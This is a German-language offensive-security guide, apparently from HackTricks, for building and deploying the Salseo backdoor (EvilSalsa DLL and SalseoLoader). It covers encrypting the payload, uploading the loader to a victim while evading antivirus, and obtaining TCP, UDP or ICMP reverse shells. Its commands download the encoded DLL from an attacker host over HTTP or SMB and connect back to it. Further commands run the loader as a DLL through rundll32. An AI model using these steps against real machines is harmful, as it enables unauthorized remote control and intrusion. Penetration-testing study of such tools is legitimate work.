# Salseo

{{#include ../banners/hacktricks-training.md}}

## Kompilieren der Binaries

Lade den Quellcode von GitHub herunter und kompiliere **EvilSalsa** und **SalseoLoader**. Du benötigst **Visual Studio**, um den Code zu kompilieren.

Kompiliere diese Projekte für die Architektur des Windows-Systems, auf dem du sie verwenden möchtest (Wenn Windows x64 unterstützt, kompiliere sie für diese Architektur).

Du kannst **die Architektur auswählen** innerhalb von Visual Studio im **linken "Build"-Tab** unter **"Platform Target".**

(\*\*Wenn du diese Optionen nicht findest, klicke auf **"Project Tab"** und dann auf **"\<Project Name> Properties"**)

![](<../images/image (132).png>)

Dann baue beide Projekte (Build -> Build Solution) (Im Protokoll wird der Pfad der ausführbaren Datei angezeigt):

![](<../images/image (1) (2) (1) (1) (1).png>)

## Bereite das Backdoor vor

Zuerst musst du die **EvilSalsa.dll** kodieren. Dazu kannst du das Python-Skript **encrypterassembly.py** verwenden oder das Projekt **EncrypterAssembly** kompilieren:

### **Python**
```
python EncrypterAssembly/encrypterassembly.py <FILE> <PASSWORD> <OUTPUT_FILE>
python EncrypterAssembly/encrypterassembly.py EvilSalsax.dll password evilsalsa.dll.txt
```
### Windows
```
EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
```
Ok, jetzt hast du alles, was du brauchst, um das Salseo-Ding auszuführen: die **kodierte EvilDalsa.dll** und die **Binärdatei von SalseoLoader.**

**Lade die SalseoLoader.exe-Binärdatei auf die Maschine hoch. Sie sollten von keinem AV erkannt werden...**

## **Führe die Hintertür aus**

### **Erhalte eine TCP-Reverse-Shell (kodierte DLL über HTTP herunterladen)**

Denke daran, eine nc als Reverse-Shell-Listener und einen HTTP-Server zu starten, um das kodierte evilsalsa bereitzustellen.
```
SalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt reversetcp <Attacker-IP> <Port>
```
### **Einen UDP-Reverse-Shell erhalten (kodierte DLL über SMB herunterladen)**

Denken Sie daran, ein nc als Reverse-Shell-Listener zu starten und einen SMB-Server, um das kodierte evilsalsa bereitzustellen (impacket-smbserver).
```
SalseoLoader.exe password \\<Attacker-IP>/folder/evilsalsa.dll.txt reverseudp <Attacker-IP> <Port>
```
### **Einen ICMP-Reverse-Shell erhalten (kodierte DLL bereits im Opfer)**

**Diesmal benötigen Sie ein spezielles Tool auf dem Client, um die Reverse-Shell zu empfangen. Laden Sie herunter:** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)

#### **ICMP-Antworten deaktivieren:**
```
sysctl -w net.ipv4.icmp_echo_ignore_all=1

#You finish, you can enable it again running:
sysctl -w net.ipv4.icmp_echo_ignore_all=0
```
#### Führen Sie den Client aus:
```
python icmpsh_m.py "<Attacker-IP>" "<Victm-IP>"
```
#### Im Inneren des Opfers, lassen Sie uns das salseo-Ding ausführen:
```
SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>
```
## Kompilieren von SalseoLoader als DLL, die die Hauptfunktion exportiert

Öffnen Sie das SalseoLoader-Projekt mit Visual Studio.

### Fügen Sie vor der Hauptfunktion hinzu: \[DllExport]

![](<../images/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

### Installieren Sie DllExport für dieses Projekt

#### **Tools** --> **NuGet-Paket-Manager** --> **NuGet-Pakete für die Lösung verwalten...**

![](<../images/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

#### **Suchen Sie nach dem DllExport-Paket (unter Verwendung des Browse-Tabs) und drücken Sie Installieren (und akzeptieren Sie das Popup)**

![](<../images/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

In Ihrem Projektordner sind die Dateien erschienen: **DllExport.bat** und **DllExport_Configure.bat**

### **De**installieren Sie DllExport

Drücken Sie **Deinstallieren** (ja, es ist seltsam, aber vertrauen Sie mir, es ist notwendig)

![](<../images/image (5) (1) (1) (2) (1).png>)

### **Beenden Sie Visual Studio und führen Sie DllExport_configure aus**

Beenden Sie einfach Visual Studio

Gehen Sie dann zu Ihrem **SalseoLoader-Ordner** und **führen Sie DllExport_Configure.bat** aus

Wählen Sie **x64** (wenn Sie es in einer x64-Umgebung verwenden möchten, war das in meinem Fall so), wählen Sie **System.Runtime.InteropServices** (innerhalb von **Namespace für DllExport**) und drücken Sie **Übernehmen**

![](<../images/image (7) (1) (1) (1) (1).png>)

### **Öffnen Sie das Projekt erneut mit Visual Studio**

**\[DllExport]** sollte nicht länger als Fehler markiert sein

![](<../images/image (8) (1).png>)

### Lösung erstellen

Wählen Sie **Ausgabetyp = Klassenbibliothek** (Projekt --> SalseoLoader-Eigenschaften --> Anwendung --> Ausgabetyp = Klassenbibliothek)

![](<../images/image (10) (1).png>)

Wählen Sie die **x64** **Plattform** (Projekt --> SalseoLoader-Eigenschaften --> Erstellen --> Plattformziel = x64)

![](<../images/image (9) (1) (1).png>)

Um die Lösung zu **erstellen**: Erstellen --> Lösung erstellen (Im Ausgabekonsolenfenster wird der Pfad zur neuen DLL angezeigt)

### Testen Sie die generierte DLL

Kopieren Sie die DLL und fügen Sie sie dort ein, wo Sie sie testen möchten.

Führen Sie aus:
```
rundll32.exe SalseoLoader.dll,main
```
Wenn kein Fehler auftritt, haben Sie wahrscheinlich eine funktionale DLL!!

## Holen Sie sich eine Shell mit der DLL

Vergessen Sie nicht, einen **HTTP** **Server** zu verwenden und einen **nc** **Listener** einzurichten

### Powershell
```
$env:pass="password"
$env:payload="http://10.2.0.5/evilsalsax64.dll.txt"
$env:lhost="10.2.0.5"
$env:lport="1337"
$env:shell="reversetcp"
rundll32.exe SalseoLoader.dll,main
```
### CMD
```
set pass=password
set payload=http://10.2.0.5/evilsalsax64.dll.txt
set lhost=10.2.0.5
set lport=1337
set shell=reversetcp
rundll32.exe SalseoLoader.dll,main
```
{{#include ../banners/hacktricks-training.md}}
